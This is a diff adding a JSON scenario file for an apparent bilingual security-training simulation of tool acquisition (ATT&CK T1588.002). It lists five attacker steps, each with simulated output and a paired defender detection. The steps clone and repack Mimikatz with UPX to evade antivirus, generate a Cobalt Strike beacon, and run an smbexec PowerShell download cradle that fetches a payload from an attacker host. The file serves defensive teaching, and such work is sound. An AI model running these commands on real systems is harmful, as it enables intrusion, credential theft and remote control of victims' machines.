@@ -1,0 +1,190 @@
+{
+  "id": "T1588.002",
+  "title": "공격 도구 획득 시뮬레이션",
+  "titleEn": "Obtain Tool Simulation",
+  "duration": 10,
+  "phases": [
+    { "label": "🔍 도구 수집", "labelEn": "🔍 Tool Collection", "steps": [0, 1] },
+    { "label": "⚡ 도구 준비", "labelEn": "⚡ Tool Preparation", "steps": [2, 3] },
+    { "label": "✅ 운영 테스트", "labelEn": "✅ Operational Test", "steps": [4] }
+  ],
+  "topoNodes": [
+    { "id": "ext", "label": "Attacker", "x": 50, "y": 60 },
+    { "id": "repo", "label": "GitHub/Dark Web", "x": 200, "y": 30 },
+    { "id": "build", "label": "Build Server", "x": 200, "y": 90 },
+    { "id": "c2", "label": "C2 Server", "x": 350, "y": 60 },
+    { "id": "victim", "label": "Victim PC", "x": 500, "y": 60 }
+  ],
+  "topoEdges": [
+    { "from": "ext", "to": "repo", "minStep": 0 },
+    { "from": "repo", "to": "build", "minStep": 1 },
+    { "from": "build", "to": "c2", "minStep": 2 },
+    { "from": "c2", "to": "victim", "minStep": 4 }
+  ],
+  "desktopIcons": [
+    { "name": "🗑️ Recycle Bin", "icon": "🗑️" },
+    { "name": "{companyName} Tools", "icon": "📁" },
+    { "name": "beacon.exe", "icon": "⚙️", "alert": true },
+    { "name": "mimikatz.zip", "icon": "📦" }
+  ],
+  "steps": [
+    {
+      "cmd": "git clone https://github.com/gentilkiwi/mimikatz.git && cd mimikatz && git log --oneline -5",
+      "out": "Cloning into 'mimikatz'...\nremote: Enumerating objects: 8234, done.\nremote: Counting objects: 100% (842/842), done.\nremote: Compressing objects: 100% (312/312), done.\nReceiving objects: 100% (8234/8234), 45.2 MiB, done.\n\na1b2c3d Fix minor compilation issue\ne4f5g6h Update kull_m_rpc for new Windows builds\ni7j8k9l Add sekurlsa::cloudap for Azure AD\nm0n1o2p Refactor dpapi module\nq3r4s5t Release v2.2.0-20230718",
+      "def": "[EDR] Known offensive tool repository cloned — git clone mimikatz detected",
+      "defAction": "Source: Attacker Workstation 10.20.30.40\nTarget: GitHub API\nAction: Alert generated, process tree captured for investigation",
+      "desc": "공개 GitHub 저장소에서 Mimikatz 소스코드를 다운로드합니다. 공격자는 이를 수정하여 AV 탐지를 우회할 수 있습니다.",
+      "descEn": "Downloading Mimikatz source code from public GitHub repository. Attackers can modify it to bypass AV detection.",
+      "stepTitle": "Mimikatz 소스코드 다운로드",
+      "stepTitleEn": "Mimikatz Source Code Download",
+      "feynman": "인터넷에 공개된 '만능열쇠 설계도'를 다운로드하는 것과 같습니다. Mimikatz는 원래 Windows 보안 연구용으로 만들어졌지만, 공격자들이 컴퓨터에 저장된 비밀번호를 훔치는 데 악용합니다. GitHub에 소스코드가 공개되어 있어 누구나 다운로드할 수 있습니다.",
+      "feynmanEn": "Like downloading publicly available 'master key blueprints' from the internet. Mimikatz was originally created for Windows security research, but attackers abuse it to steal passwords stored on computers.",
+      "expert": "Mimikatz는 LSASS 프로세스 메모리에서 NTLM 해시, Kerberos 티켓, 평문 패스워드를 추출합니다. 소스코드를 수정하면 시그니처 기반 AV를 우회할 수 있습니다.",
+      "expertEn": "Mimikatz extracts NTLM hashes, Kerberos tickets, and plaintext passwords from LSASS process memory. Modifying source code can bypass signature-based AV.",
+      "defTooltip": "🔗 EDR: 알려진 공격 도구 저장소 클론 감지",
+      "defTooltipEn": "🔗 EDR: Known offensive tool repository clone detected",
+      "hackerLog": {
+        "title": "tool_acquisition.log",
+        "lines": [
+          { "log": "Repository: gentilkiwi/mimikatz", "desc": "💡 가장 유명한 자격증명 덤프 도구의 소스 저장소" },
+          { "log": "Size: 45.2 MiB, Commits: 8234", "desc": "💡 활발히 유지보수되는 프로젝트 — 최신 Windows 버전 지원" },
+          { "log": "Latest: sekurlsa::cloudap for Azure AD", "desc": "💡 Azure AD 토큰까지 추출 가능한 최신 기능 추가" }
+        ]
+      },
+      "terms": [
+        { "name": "Mimikatz", "desc": "Windows 자격증명을 메모리에서 추출하는 오픈소스 보안 도구. sekurlsa, kerberos, dpapi 등 모듈 제공." },
+        { "name": "LSASS", "desc": "Local Security Authority Subsystem Service. Windows 인증 정보를 관리하는 핵심 프로세스." }
+      ]
+    },
+    {
+      "cmd": "curl -s 'https://darkmarket[.]onion/api/tools?category=c2' -H 'Auth: tok_buyer_anon' | jq '.[] | {name, price, rating}'",
+      "out": "{\n  \"name\": \"Cobalt Strike 4.9 (cracked)\",\n  \"price\": \"$2,500 BTC\",\n  \"rating\": \"4.8/5 (312 reviews)\"\n}\n{\n  \"name\": \"Brute Ratel C4 v1.4\",\n  \"price\": \"$3,000 XMR\",\n  \"rating\": \"4.9/5 (89 reviews)\"\n}\n{\n  \"name\": \"Sliver C2 (custom build + EDR bypass)\",\n  \"price\": \"$1,200 XMR\",\n  \"rating\": \"4.6/5 (156 reviews)\"\n}\n{\n  \"name\": \"Nighthawk C2 (leaked)\",\n  \"price\": \"$4,000 BTC\",\n  \"rating\": \"4.7/5 (45 reviews)\"\n}",
+      "def": "[Threat Intel] Dark web marketplace listing for cracked C2 frameworks monitored",
+      "defAction": "Source: Dark Web Monitoring Feed\nTarget: Threat Intelligence Platform\nAction: IOC extraction, seller profile linked to known threat actor cluster",
+      "desc": "다크웹 마켓플레이스에서 크랙된 C2 프레임워크를 검색합니다. 상업용 도구의 불법 복제 버전이 거래되고 있습니다.",
+      "descEn": "Searching dark web marketplace for cracked C2 frameworks. Pirated versions of commercial tools are being traded.",
+      "stepTitle": "다크웹 C2 도구 검색",
+      "stepTitleEn": "Dark Web C2 Tool Search",
+      "feynman": "불법 복제 소프트웨어를 파는 '암시장'을 방문하는 것과 같습니다. Cobalt Strike같은 비싼 보안 도구($5,900 정품)를 크랙하여 저렴하게 판매합니다. 구매자 리뷰와 평점까지 있어 마치 일반 쇼핑몰처럼 운영됩니다.",
+      "feynmanEn": "Like visiting a black market selling pirated software. Expensive security tools like Cobalt Strike ($5,900 retail) are cracked and sold cheaply. Even buyer reviews and ratings exist, operating like a regular marketplace.",
+      "expert": "크랙된 Cobalt Strike는 가장 많이 악용되는 C2 도구입니다. 정품의 라이선스 검증 코드를 패치하여 배포하며, 동일한 IOC 패턴을 가집니다.",
+      "expertEn": "Cracked Cobalt Strike is the most abused C2 tool. License verification code is patched for distribution, sharing identical IOC patterns.",
+      "defTooltip": "🔗 위협 인텔리전스: 다크웹 C2 도구 거래 모니터링",
+      "defTooltipEn": "🔗 Threat Intel: Dark web C2 tool trade monitoring",
+      "hackerLog": {
+        "title": "darkweb_search.log",
+        "lines": [
+          { "log": "Cobalt Strike 4.9 cracked: $2,500 BTC", "desc": "💡 정품 $5,900 대비 42% 가격 — 라이선스 패치 버전" },
+          { "log": "Brute Ratel C4: $3,000 XMR", "desc": "💡 EDR 우회 특화 C2 — Monero 결제로 추적 회피" },
+          { "log": "Reviews: 4.8/5 (312 reviews)", "desc": "💡 구매자 리뷰 시스템까지 갖춘 전문 마켓" }
+        ]
+      },
+      "terms": [
+        { "name": "Cobalt Strike", "desc": "상업용 레드팀 C2 프레임워크. Beacon 에이전트, Malleable C2, Artifact Kit 등 고급 기능 제공." },
+        { "name": "Brute Ratel C4", "desc": "EDR 우회에 특화된 신세대 C2 프레임워크. Syscall 직접 호출, ETW 패칭 등 고급 회피 기법 내장." }
+      ]
+    },
+    {
+      "cmd": "x86_64-w64-mingw32-gcc -o mimikatz_custom.exe mimikatz/mimikatz/mimikatz.c -DCUSTOM_BUILD -s -O2 -mwindows && upx --best mimikatz_custom.exe && sha256sum mimikatz_custom.exe",
+      "out": "x86_64-w64-mingw32-gcc: compiling with custom definitions...\n[OK] mimikatz_custom.exe compiled successfully (1,248,512 bytes)\n\n                       Ultimate Packer for eXecutables\n   File size         Ratio      Format      Name\n   ----------   ----------   -----------   -----------\n   1248512 ->    524288       41.99%       win64/pe     mimikatz_custom.exe\n\nPacked 1 file.\n\nsha256: f7e8d9c0b1a2... (NEW hash — 0/68 VirusTotal detection)",
+      "def": "[Build Server] Cross-compilation of known offensive tool with UPX packing detected",
+      "defAction": "Source: Build Server 10.20.30.41\nTarget: Binary output directory\nAction: Build artifact quarantined, sandbox analysis initiated",
+      "desc": "Mimikatz 소스를 수정 후 크로스 컴파일하고 UPX로 패킹하여 AV 시그니처를 우회합니다.",
+      "descEn": "Cross-compiling modified Mimikatz source and packing with UPX to bypass AV signatures.",
+      "stepTitle": "커스텀 빌드 및 패킹",
+      "stepTitleEn": "Custom Build and Packing",
+      "feynman": "공장에서 만든 자동차를 개조하여 번호판을 바꾸는 것과 비슷합니다. Mimikatz 소스코드를 수정하면 새로운 해시값이 생기므로, 기존 바이러스 탐지 데이터베이스에 등록되지 않습니다. UPX 패킹은 실행 파일을 압축하여 내부 코드 패턴을 숨깁니다.",
+      "feynmanEn": "Like modifying a factory-made car and changing its license plate. Modifying Mimikatz source generates a new hash, so it's not in existing virus detection databases. UPX packing compresses the executable to hide internal code patterns.",
+      "expert": "DCUSTOM_BUILD 플래그로 문자열 상수를 변경하면 YARA 룰 기반 탐지를 우회합니다. UPX 패킹으로 정적 분석을 방해하지만 런타임 언패킹 후 메모리 스캔으로 탐지 가능합니다.",
+      "expertEn": "DCUSTOM_BUILD flag changes string constants to bypass YARA rule-based detection. UPX packing hinders static analysis but can be detected by memory scanning after runtime unpacking.",
+      "defTooltip": "🔗 빌드 서버: 크로스컴파일 + UPX 패킹 조합 감지",
+      "defTooltipEn": "🔗 Build Server: Cross-compilation + UPX packing combination detected",
+      "hackerLog": {
+        "title": "build_custom.log",
+        "lines": [
+          { "log": "Custom build: 0/68 VT detection", "desc": "💡 수정된 소스 + 새 해시 = AV 완전 우회" },
+          { "log": "UPX compression: 41.99% ratio", "desc": "💡 패킹으로 정적 분석 방해 — 문자열 검색 불가" },
+          { "log": "Cross-compile: mingw32 for Windows", "desc": "💡 Linux에서 Windows PE 바이너리 생성" }
+        ]
+      },
+      "terms": [
+        { "name": "UPX", "desc": "Ultimate Packer for eXecutables. 실행 파일 압축 도구로 파일 크기 감소 및 정적 분석 방해에 사용." },
+        { "name": "크로스 컴파일", "desc": "한 운영체제에서 다른 운영체제용 바이너리를 생성하는 컴파일 방식. 리눅스에서 Windows PE 생성 등." }
+      ]
+    },
+    {
+      "cmd": "./cobaltstrike --generate-beacon --profile jquery-c2.profile --output beacon_stager.exe --listener https --host cdn-static.azureedge[.]net --port 443",
+      "out": "[*] Cobalt Strike 4.9 (cracked) — Team Server\n[*] Loading Malleable C2 Profile: jquery-c2.profile\n    - HTTP GET:  /jquery-3.3.1.min.js\n    - HTTP POST: /__utm.gif\n    - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n    - Sleep: 60s (jitter 37%)\n[*] Generating HTTPS Beacon stager...\n[+] Beacon: beacon_stager.exe (284 KB)\n[+] SHA256: c4d5e6f7a8b9...\n[+] Listener: https://cdn-static.azureedge[.]net:443\n[*] Stager ready for deployment",
+      "def": "[Network Monitor] Suspicious TLS connection to newly registered domain with JA3 hash matching Cobalt Strike",
+      "defAction": "Source: Beacon stager process\nTarget: cdn-static.azureedge[.]net:443\nAction: JA3 hash flagged, domain age checked (2 days), connection blocked",
+      "desc": "크랙된 Cobalt Strike로 Malleable C2 프로필을 적용한 HTTPS Beacon을 생성합니다.",
+      "descEn": "Generating HTTPS Beacon with Malleable C2 profile using cracked Cobalt Strike.",
+      "stepTitle": "Cobalt Strike Beacon 생성",
+      "stepTitleEn": "Cobalt Strike Beacon Generation",
+      "feynman": "스파이 영화에서 변장을 하는 것과 비슷합니다. Beacon이라는 '첩보원'에게 jQuery 라이브러리 다운로드를 가장한 통신 방법(Malleable C2 프로필)을 알려줍니다. 보안 장비는 이 통신을 일반 웹 트래픽으로 착각합니다.",
+      "feynmanEn": "Like a spy putting on a disguise in a movie. The Beacon 'agent' is given a communication method (Malleable C2 profile) disguised as jQuery library downloads. Security devices mistake this traffic for normal web browsing.",
+      "expert": "Malleable C2 프로필은 Beacon 통신을 합법적 HTTP 트래픽으로 위장합니다. jQuery 프로필은 실제 jQuery CDN 요청 패턴을 모방하여 네트워크 탐지를 우회합니다.",
+      "expertEn": "Malleable C2 profiles disguise Beacon communication as legitimate HTTP traffic. jQuery profile mimics actual jQuery CDN request patterns to bypass network detection.",
+      "defTooltip": "🔗 네트워크: JA3 핑거프린트 + 신규 도메인 조합 탐지",
+      "defTooltipEn": "🔗 Network: JA3 fingerprint + newly registered domain combination detected",
+      "hackerLog": {
+        "title": "beacon_gen.log",
+        "lines": [
+          { "log": "Profile: jquery-c2.profile", "desc": "💡 jQuery CDN 요청을 모방하는 Malleable C2 프로필" },
+          { "log": "Sleep: 60s (jitter 37%)", "desc": "💡 비커닝 간격에 랜덤 변동을 추가하여 패턴 탐지 회피" },
+          { "log": "Listener: cdn-static.azureedge[.]net", "desc": "💡 Azure CDN 도메인을 사칭하여 신뢰도 확보" }
+        ]
+      },
+      "terms": [
+        { "name": "Malleable C2", "desc": "Cobalt Strike의 통신 프로필 시스템. HTTP 요청/응답 형태를 자유롭게 정의하여 합법적 트래픽으로 위장." },
+        { "name": "JA3 Fingerprint", "desc": "TLS Client Hello 패킷의 고유 해시. 클라이언트 소프트웨어를 식별하는 데 사용되는 네트워크 포렌식 기법." }
+      ]
+    },
+    {
+      "cmd": "python3 impacket/examples/smbexec.py {companyName}/admin:'P@ssw0rd123'@10.10.50.25 -command 'powershell -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadString(\\\"https://cdn-static.azureedge[.]net/jquery-3.3.1.min.js\\\")\"'",
+      "out": "Impacket v0.11.0 - Copyright 2023 Fortra\n\n[*] SMBExec - Connecting to 10.10.50.25...\n[*] Authenticated as {companyName}\\admin\n[*] Creating service BTHSRV on 10.10.50.25...\n[*] Starting service BTHSRV...\n[*] Command executed successfully\n\n--- Cobalt Strike Team Server ---\n[+] New Beacon check-in: 10.10.50.25\n[+] User: {companyName}\\admin (Administrator)\n[+] OS: Windows Server 2022 (Build 20348)\n[+] Process: powershell.exe (PID: 7824)\n[+] Beacon ID: 0x1a2b3c4d\n[+] Sleep: 60s (jitter 37%)",
+      "def": "[SIEM] SMB lateral movement with immediate PowerShell download cradle — Cobalt Strike Beacon callback detected",
+      "defAction": "Source: 10.10.50.25 (powershell.exe PID 7824)\nTarget: cdn-static.azureedge[.]net:443\nAction: Host isolated, Beacon process terminated, credential reset initiated",
+      "desc": "획득한 도구들을 조합하여 실제 공격을 수행합니다. Impacket으로 측면 이동 후 Cobalt Strike Beacon을 실행합니다.",
+      "descEn": "Combining obtained tools for actual attack execution. Lateral movement via Impacket followed by Cobalt Strike Beacon execution.",
+      "stepTitle": "도구 조합 공격 실행",
+      "stepTitleEn": "Combined Tool Attack Execution",
+      "feynman": "여러 도구를 조합하여 하나의 공격 작전을 수행하는 것입니다. Impacket(원격 접속 도구)으로 다른 컴퓨터에 접근한 뒤, Cobalt Strike Beacon(원격 조종 프로그램)을 설치합니다. 마치 열쇠(Impacket)로 문을 열고 도청 장치(Beacon)를 설치하는 것과 같습니다.",
+      "feynmanEn": "Combining multiple tools to execute a single attack operation. After accessing another computer with Impacket (remote access tool), Cobalt Strike Beacon (remote control program) is installed. Like using a key (Impacket) to open a door and plant a listening device (Beacon).",
+      "expert": "SMBExec는 서비스 생성 기반 원격 실행을 수행합니다. PowerShell 다운로드 크래들로 Beacon 스테이저를 메모리에서 직접 실행하여 디스크 포렌식을 회피합니다.",
+      "expertEn": "SMBExec performs remote execution via service creation. PowerShell download cradle executes Beacon stager directly in memory to evade disk forensics.",
+      "defTooltip": "🔗 SIEM: SMB 측면 이동 + PowerShell 다운로드 크래들 + C2 콜백 다중 탐지",
+      "defTooltipEn": "🔗 SIEM: SMB lateral movement + PowerShell download cradle + C2 callback multi-detection",
+      "hackerLog": {
+        "title": "combined_attack.log",
+        "lines": [
+          { "log": "SMBExec → 10.10.50.25 as admin", "desc": "💡 탈취된 관리자 자격증명으로 SMB 원격 실행" },
+          { "log": "Beacon check-in: 0x1a2b3c4d", "desc": "💡 Cobalt Strike Beacon 연결 성공 — 원격 제어 가능" },
+          { "log": "Tools used: Impacket + Cobalt Strike + Mimikatz", "desc": "💡 3개 도구 조합 — 각각 다른 공격 단계 담당" }
+        ]
+      },
+      "terms": [
+        { "name": "Impacket", "desc": "Python 기반 네트워크 프로토콜 라이브러리. SMB, WMI, DCOM 등을 통한 원격 명령 실행 도구 모음." },
+        { "name": "Download Cradle", "desc": "PowerShell 등 스크립트로 원격 페이로드를 메모리에 직접 로드하여 실행하는 기법. 디스크에 파일을 저장하지 않음." }
+      ]
+    }
+  ],
+  "processTree": [
+    { "pid": 1, "name": "init", "children": [
+      { "pid": 1200, "name": "bash", "children": [
+        { "pid": 1201, "name": "git clone mimikatz", "children": [] },
+        { "pid": 1205, "name": "mingw32-gcc", "children": [
+          { "pid": 1206, "name": "upx --best", "children": [] }
+        ]},
+        { "pid": 1210, "name": "cobaltstrike", "children": [
+          { "pid": 1211, "name": "beacon_gen", "children": [] }
+        ]},
+        { "pid": 1215, "name": "smbexec.py", "children": [
+          { "pid": 1216, "name": "powershell.exe (remote)", "children": [
+            { "pid": 1217, "name": "beacon.exe", "children": [] }
+          ]}
+        ]}
+      ]}
+    ]}
+  ]
+}
